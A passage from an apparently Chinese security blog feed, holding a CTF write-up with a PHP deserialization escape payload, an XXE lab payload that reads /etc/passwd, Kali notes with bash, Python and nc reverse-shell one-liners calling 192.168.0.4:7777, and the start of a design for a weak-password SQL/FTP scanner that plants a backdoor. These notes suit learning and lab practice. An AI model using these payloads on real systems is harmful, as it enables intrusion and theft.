class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;class.php&apos;);</span><br><span class="line">if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">die(&apos;Login First&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">die(&apos;Invalid email&apos;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在 <code>profile.php</code> 中找到明显的 </p><p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p><p>读取文件内容，而 <code>flag</code> 放在 <code>config.php</code> 文件中，我们要想办法读这个文件。但是上面读文件的参数限定了 <code>photo</code> ，我们在 <code>update.php</code> 中找到有关代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要 <code>POST</code> 四个参数，并且发现 对 <code>nickname</code> 的过滤与前两个不同，可以使用数组绕过。</p><p>然后对<code>$profile</code> 进行序列化并传入过滤函数进行过滤。我们接着看过滤函数</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// \|\\\\</span></span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现从 <code>where</code> -&gt; <code>hacker</code> ,长度增加，联想到之前的反序列化字符逃逸。</p><p>我们在本地实验得到序列化后的字符串是(注意已经将nickname改为数组)</p><p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p><p>我们想读的文件是 <code>config.pgp</code> ,也就是要添加<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,长度为34，也就是说我们要追加 34 个 <code>where</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:4:&#123;s:5:"</span>phone<span class="string">";s:11:"</span><span class="number">12345678901</span><span class="string">";s:5:"</span>email<span class="string">";s:8:"</span>ss@q.com<span class="string">";s:8:"</span>nickname<span class="string">";a:1:&#123;i:0;s:204:"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">"&#125;;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;s:39:"</span>upload/<span class="number">804</span>f743824c0451b2f60d81b63b6a900<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>之后抓包修改 nickname 为数组，将值改为上面我们构造的内容即可。</p><h2 id="real"><a href="#real" class="headerlink" title="real"></a>real</h2><p>12/19/2019 10:32:05 AM </p><h3 id="php-xxe"><a href="#php-xxe" class="headerlink" title="php_xxe"></a>php_xxe</h3><p>libxml2 2.9.4之前版本，parser.c/xmlStringLenDecodeEntities函数存在XML外部实体漏洞，不在验证模式时，可使上下文独立的攻击者读取任意文件或造成拒绝服务。</p><p>web目录./www包含4个文件：</p><pre><code>$ tree ..├── dom.php # 示例：使用DOMDocument解析body├── index.php├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</code></pre><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发XXE漏洞</p><p><strong>requests:</strong></p><pre><code>GET /SimpleXMLElement.php HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-aliveCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1Cache-Control: max-age=0Content-Length: 163&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p><strong>response</strong></p><pre><code>HTTP/1.1 200 OKHost: node3.buuoj.cn:26506Connection: closeX-Powered-By: PHP/7.0.30Content-type: text/html; charset=UTF-8root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>还可以进行内网探测：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;127.0.0.1    localhost::1    localhost ip6-localhost ip6-loopbackfe00::0    ip6-localnetff00::0    ip6-mcastprefixff02::1    ip6-allnodesff02::2    ip6-allrouters174.0.56.234    283819a6c89d</code></pre><p>常用的内网 IP 文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-usage</title>
      <link href="/2020/04/29/Kali-usage/"/>
      <url>/2020/04/29/Kali-usage/</url>
      
        <content type="html"><![CDATA[<h1 id="Kali-linux-使用备忘"><a href="#Kali-linux-使用备忘" class="headerlink" title="Kali linux 使用备忘"></a>Kali linux 使用备忘</h1><h2 id="网络无法连接"><a href="#网络无法连接" class="headerlink" title="网络无法连接"></a>网络无法连接</h2><ol><li><p>ifconfig 只有 Local</p><p>先检查一下 DNS 有没有忘记配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/resolv.conf</span><br><span class="line">   nameserver 8.8.8.8 or your dns server</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">检查一下 eth0 网卡</span><br><span class="line">   </span><br><span class="line">   ifconfig eth0 up</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line">   iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">  <span class="built_in"> service </span>networking restart</span><br></pre></td></tr></table></figure><h2 id="无法获得锁"><a href="#无法获得锁" class="headerlink" title="无法获得锁"></a>无法获得锁</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)</span><br><span class="line">E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</span><br></pre></td></tr></table></figure><p>只要</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock </span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure><h2 id="Environment-variables"><a href="#Environment-variables" class="headerlink" title="Environment variables"></a>Environment variables</h2><p>可以分为两大类：enviroment variables and shell variables</p><p><strong>Enviroment varialbes</strong> : 可以在整个系统范围内使用，并且被所有衍生的子进程和 shells 所继承。</p><p><strong>Shell varialbes</strong> : 只能被用于当前的 shell 。就像 zsh 和 bash ，每个 shell 都有自己的内部变量集。</p><p>下面这些命令允许你列出来 enviroment vraiables 并且可以配置。</p><ul><li><code>env</code> – The command allows you to run another program in a  custom environment without modifying the current one. When used without  an argument it will print a list of the current environment variables.</li><li><code>printenv</code> – The command prints all or the specified environment variables.</li><li><code>set</code> – The command sets or unsets shell variables. When used without an argument it will print a list of all variables including  environment and shell variables, and shell functions.</li><li><code>unset</code> – The command deletes shell and environment variables.</li><li><code>export</code> – The command sets environment variables.</li></ul><h3 id="Persistent-Environment-Variables"><a href="#Persistent-Environment-Variables" class="headerlink" title="Persistent Environment Variables"></a>Persistent Environment Variables</h3><p>为了环境变量能持久(?) 我们需要到 bash 配置文件中定义一下。在大多数 Linux 发行版里我们需要重启一个会话。环境变量从下面几个文件里读取：</p><ul><li><p><code>/etc/environment</code> - Use this file to set up system-wide environment variables. Variables in this file are set in the following format:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FOO=bar</span><br><span class="line">VAR_TEST=<span class="string">"Test Var"</span></span><br></pre></td></tr></table></figure></li><li><p><code>/etc/profile</code> - Variables set in this file are loaded  whenever a bash login shell is entered. When declaring environment  variables in this file you need to use the <code>export</code> command:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=<span class="string">"/path/to/java/home"</span></span><br><span class="line">export PATH=<span class="variable">$PATH:</span><span class="variable">$JAVA_HOME</span>/bin</span><br></pre></td></tr></table></figure></li><li><p>Per-user shell specific configuration files. For example, if you are using Bash, you can declare the variables in the <code>~/.bashrc</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=<span class="string">"<span class="variable">$HOME</span>/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure></li></ul><p>To load the new environment variables into the current shell session use the <a href="https://linuxize.com/post/bash-source-command/" target="_blank" rel="noopener"><code>source</code></a> command:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h2 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin      是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、<span class="built_in">kill</span>、ls、mkdir、more、mount、rm、su、tar等。    </span><br><span class="line">/sbin     一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。   </span><br><span class="line">/usr/bin　是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</span><br><span class="line">/usr/sbin 放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、<span class="keyword">in</span>.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。    </span><br><span class="line">如果新装的系统，运行一些很正常的诸如：shutdown，fdisk的命令时，悍然提示：bash:<span class="built_in">command</span> not found。那么首先就要考虑root 的<span class="variable">$PATH</span>里是否已经包含了这些环境变量。    </span><br><span class="line">可以查看PATH，如果是：PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin则需要添加成如下：PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:/sbin:/usr/bin:/usr/sbin</span><br></pre></td></tr></table></figure><p>在 Kali 中我们可以看到 /bin/sh 是一个静态链接，链接到 <code>dash</code> ,而 <code>dash</code> 与 <code>bash</code> 一样，作为系统 <code>shell</code> 使用。</p><p>查看当前使用 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll `which sh`</span><br></pre></td></tr></table></figure><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line">nmap -sn 192.168.0.0/24</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.0.105</span><br></pre></td></tr></table></figure><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb url</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="搜索脚本"><a href="#搜索脚本" class="headerlink" title="搜索脚本"></a>搜索脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit druopl 7</span><br></pre></td></tr></table></figure><p>如果是 py 文件，可以直接根据提供的路径运行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.0.4&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);</span><br></pre></td></tr></table></figure><p>nc 反向连接，前提是目标机器有nc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure><p>nc 安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span>  netcat path</span></span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>互联网sql、ftp服务弱口令探测</title>
      <link href="/2020/04/29/%E4%BA%92%E8%81%94%E7%BD%91sql%E3%80%81ftp%E6%9C%8D%E5%8A%A1%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8E%A2%E6%B5%8B/"/>
      <url>/2020/04/29/%E4%BA%92%E8%81%94%E7%BD%91sql%E3%80%81ftp%E6%9C%8D%E5%8A%A1%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="互联网sql、ftp服务弱口令探测"><a href="#互联网sql、ftp服务弱口令探测" class="headerlink" title="互联网sql、ftp服务弱口令探测"></a>互联网sql、ftp服务弱口令探测</h1><p>12/11/2019 1:26:12 PM </p><h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><ul><li>给定网段，扫描存活主机(<code>def get_ip</code>)，将IP地址存放在 <code>iprange.txt</code> 中</li><li>由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(<code>def port_scan</code>)</li><li>对于开放目标服务的端口尝试进行弱口令登陆，弱口令密码存放在 <code>dict.txt</code> 中(‘<code>def try_login</code>‘)</li><li>对于 <code>sqlserver</code> ，如果登陆成功，则创建后门服务</li><li>实现图形化界面，采用 Qt desinger 技术</li><li>语言选择 python 2.0+ ，并使用多线程技术</li></ul><h2 id="互联网主机探活"><a href="#互联网主机探活" class="headerlink" title="互联网主机探活"></a>互联网主机探活</h2><p>对于主机探活部分参考 nmap 的说明文档</p><blockquote><p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。 当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图 突破防火墙的封锁。</p><p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 